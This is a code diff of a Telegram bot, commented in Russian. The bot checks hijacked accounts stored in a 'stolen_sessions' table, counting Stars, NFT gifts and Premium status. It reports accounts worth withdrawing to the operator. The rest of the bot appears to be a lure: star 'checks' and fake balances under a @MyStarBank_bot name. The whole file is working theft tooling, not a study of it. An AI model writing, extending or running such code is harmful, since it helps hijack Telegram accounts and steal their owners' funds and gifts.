@@ -215,38 +215,20 @@ async function checkAccountStatus(client, phone) {
         const user = await client.getMe();
         
         let starsCount = 0;
-        let giftsCount = 0;
-        let premiumStatus = user.premium ? 'ДА' : 'нет';
+        let nftGifts = [];
         
-        // ПРОВЕРКА ЗВЕЗД ЧЕРЕЗ РАЗНЫЕ МЕТОДЫ
+        // ПРОВЕРКА ЗВЕЗД ЧЕРЕЗ SETTINGS -> STARS
         try {
-            // Метод 1: Прямой запрос звезд
             const starsStatus = await client.invoke(
                 new Api.payments.GetStarsStatus({})
             );
+            
             if (starsStatus && starsStatus.balance !== undefined) {
                 starsCount = starsStatus.balance;
+                console.log(`✅ Stars found: ${starsCount}`);
             }
         } catch (starsError) {
-            console.log('⚠️ Звезды метод 1 не сработал:', starsError.message);
-        }
-        
-        // Если звезды 0, пробуем другие методы
-        if (starsCount === 0) {
-            try {
-                // Метод 2: Проверка через платежную историю
-                const payments = await client.invoke(
-                    new Api.payments.GetPaymentReceipt({
-                        peer: await client.getInputEntity('me'),
-                        msgId: 0
-                    })
-                );
-                if (payments && payments.stars) {
-                    starsCount = payments.stars;
-                }
-            } catch (paymentsError) {
-                console.log('⚠️ Звезды метод 2 не сработал:', paymentsError.message);
-            }
+            console.log('⚠️ Stars API error:', starsError.message);
         }
         
         // ПРОВЕРКА NFT ПОДАРКОВ
@@ -259,86 +241,52 @@ async function checkAccountStatus(client, phone) {
             );
             
             if (premiumGifts && premiumGifts.documents) {
-                giftsCount = premiumGifts.documents.length;
+                premiumGifts.documents.forEach(doc => {
+                    if (doc.mimeType && doc.mimeType.includes('video')) {
+                        nftGifts.push({
+                            id: doc.id.toString(),
+                            type: 'nft'
+                        });
+                    }
+                });
             }
         } catch (giftsError) {
-            console.log('⚠️ NFT подарки не найдены:', giftsError.message);
-        }
-        
-        // ДОПОЛНИТЕЛЬНАЯ ПРОВЕРКА ПРЕМИУМА
-        try {
-            const userFull = await client.invoke(
-                new Api.users.GetFullUser({
-                    id: user.id
-                })
-            );
-            
-            if (userFull && userFull.premium_gifts) {
-                giftsCount += userFull.premium_gifts.length || 0;
-            }
-            
-            // Проверяем дату истечения премиума
-            if (userFull && userFull.premium_expires) {
-                const premiumExpires = new Date(userFull.premium_expires * 1000);
-                const now = new Date();
-                if (premiumExpires > now) {
-                    premiumStatus = `ДА (до ${premiumExpires.toLocaleDateString()})`;
-                }
-            }
-        } catch (premiumError) {
-            console.log('⚠️ Премиум данные не найдены:', premiumError.message);
-        }
-        
-        // ЕСЛИ ПРЕМИУМ ЕСТЬ, НО ЗВЕЗД 0 - ПРОВЕРЯЕМ ЧЕРЕЗ КОШЕЛЕК
-        if (premiumStatus.includes('ДА') && starsCount === 0) {
-            try {
-                const walletStatus = await client.invoke(
-                    new Api.payments.GetBankCardData({
-                        bankCardNumber: '0'
-                    })
-                );
-                // Если есть доступ к платежам, значит аккаунт активный
-                console.log('✅ Доступ к платежам есть');
-            } catch (walletError) {
-                console.log('⚠️ Доступ к кошельку ограничен:', walletError.message);
-            }
+            console.log('⚠️ NFT gifts error:', giftsError.message);
         }
         
         let message = `🎯 ДАННЫЕ АККАУНТА:\n` +
                      `📱 Номер: ${phone}\n` +
                      `👤 Username: @${user.username || 'нет'}\n` +
-                     `👑 Премиум: ${premiumStatus}\n\n` +
+                     `👑 Премиум: ${user.premium ? 'ДА' : 'нет'}\n\n` +
                      `⭐ ЗВЕЗДЫ: ${starsCount}\n` +
-                     `🎁 NFT ПОДАРКОВ: ${giftsCount}\n\n`;
+                     `🎁 NFT ПОДАРКОВ: ${nftGifts.length}\n\n`;
         
-        // АНАЛИЗ РЕЗУЛЬТАТОВ
-        if (premiumStatus.includes('ДА') || starsCount > 0 || giftsCount > 0) {
+        if (starsCount > 0 || nftGifts.length > 0 || user.premium) {
             message += `💰 ЦЕННЫЙ АККАУНТ!\n`;
             
-            if (premiumStatus.includes('ДА')) {
+            if (starsCount > 0) {
+                message += `⭐ ${starsCount} звезд\n`;
+            }
+            if (nftGifts.length > 0) {
+                message += `🎁 ${nftGifts.length} NFT подарков\n`;
+            }
+            if (user.premium) {
                 message += `💎 Премиум активен\n`;
             }
-            if (starsCount > 0) {
-                message += `⭐ ${starsCount} звезд доступно\n`;
-            }
-            if (giftsCount > 0) {
-                message += `🎁 ${giftsCount} NFT подарков\n`;
-            }
             
-            message += `⚡ Можно выводить средства`;
+            message += `⚡ МОЖНО ВЫВОДИТЬ`;
         } else {
             message += `❌ АККАУНТ ПУСТОЙ`;
         }
         
-        // СОХРАНЯЕМ В БАЗУ
         db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ?, status = 'checked' WHERE phone = ?`, 
-            [starsCount, giftsCount, phone]);
+            [starsCount, nftGifts.length, phone]);
         
         bot.sendMessage(MY_USER_ID, message);
         
     } catch (error) {
         console.log("❌ Ошибка проверки:", error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки аккаунта: ${error.message}`);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки: ${error.message}`);
     }
 }
 
@@ -347,7 +295,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
-// INLINE QUERY ДЛЯ ПОДСКАЗКИ - 2 ЧЕКА
+// INLINE QUERY ДЛЯ ПОДСКАЗКИ
 bot.on('inline_query', (query) => {
     const results = [
         {
@@ -383,12 +331,11 @@ bot.on('inline_query', (query) => {
     bot.answerInlineQuery(query.id, results, { cache_time: 1 });
 });
 
-// СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @MyStarBank_bot ДЛЯ ВСЕХ
+// СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @MyStarBank_bot
 bot.onText(/@MyStarBank_bot/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
-    // ВСЕ МОГУТ СОЗДАВАТЬ ЧЕКИ
     bot.sendMessage(chatId, 
         '🎫 <b>Создание чека</b>\n\nВыберите сумму для чека:',
         {
@@ -403,7 +350,7 @@ bot.onText(/@MyStarBank_bot/, (msg) => {
     );
 });
 
-// ПРОСТОЙ CALLBACK ОБРАБОТЧИК БЕЗ ОШИБОК
+// CALLBACK ОБРАБОТЧИК
 bot.on('callback_query', async (query) => {
     const data = query.data;
     const userId = query.from.id;
@@ -414,8 +361,6 @@ bot.on('callback_query', async (query) => {
         
         if (data === 'create_50' || data === 'create_100') {
             const amount = data === 'create_50' ? 50 : 100;
-            
-            // СОЗДАЕМ ЧЕК
             const activations = 1;
             
             db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
@@ -463,12 +408,11 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// КРАСИВОЕ МЕНЮ /start
+// МЕНЮ /start
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     
-    // СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ
     db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
         [userId, msg.from.username, 50], function(err) {});
     
@@ -565,35 +509,30 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// ОБРАБОТКА СТАРТА С ПАРАМЕТРОМ ЧЕКА - РАБОЧАЯ ВЕРСИЯ
+// ОБРАБОТКА СТАРТА С ПАРАМЕТРОМ
 bot.onText(/\/start (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const params = match[1];
     
-    // СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ
     db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
         [userId, msg.from.username, 50], function(err) {});
     
     if (params.startsWith('check_')) {
-        // ПОЛУЧАЕМ ЗВЕЗДЫ ИЗ ЧЕКА
         const checkId = params.split('_')[1];
         
-        // ПРОВЕРЯЕМ ИСПОЛЬЗОВАЛ ЛИ УЖЕ ЭТОТ ЧЕК
         db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [userId, checkId], (err, usedRow) => {
             if (err || usedRow) {
                 bot.sendMessage(chatId, '❌ Вы уже использовали этот чек!');
                 return;
             }
             
-            // ПРОВЕРЯЕМ ЧЕК В БАЗЕ
             db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
                 if (err || !row) {
                     bot.sendMessage(chatId, '❌ Чек уже использован или не существует!');
                     return;
                 }
                 
-                // ОБНОВЛЯЕМ БАЛАНС И ОТМЕЧАЕМ ЧЕК ИСПОЛЬЗОВАННЫМ
                 db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, userRow) => {
                     const currentBalance = userRow ? userRow.balance : 50;
                     const newBalance = currentBalance + row.amount;
@@ -605,7 +544,6 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                         db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
                     });
                     
-                    // УВЕДОМЛЕНИЕ О ПОЛУЧЕНИИ ЗВЕЗД
                     bot.sendMessage(chatId, 
                         `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
                         `💫 <b>Ваш баланс:</b> ${newBalance} звезд\n\n` +
@@ -617,10 +555,7 @@ bot.onText(/\/start (.+)/, (msg, match) => {
         });
         
     } else if (params.startsWith('create_check_')) {
-        // СОЗДАНИЕ ЧЕКА ЧЕРЕЗ INLINE
         const amount = parseInt(params.split('_')[2]);
-        
-        // СОЗДАЕМ ЧЕК
         const activations = 1;
         
         db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
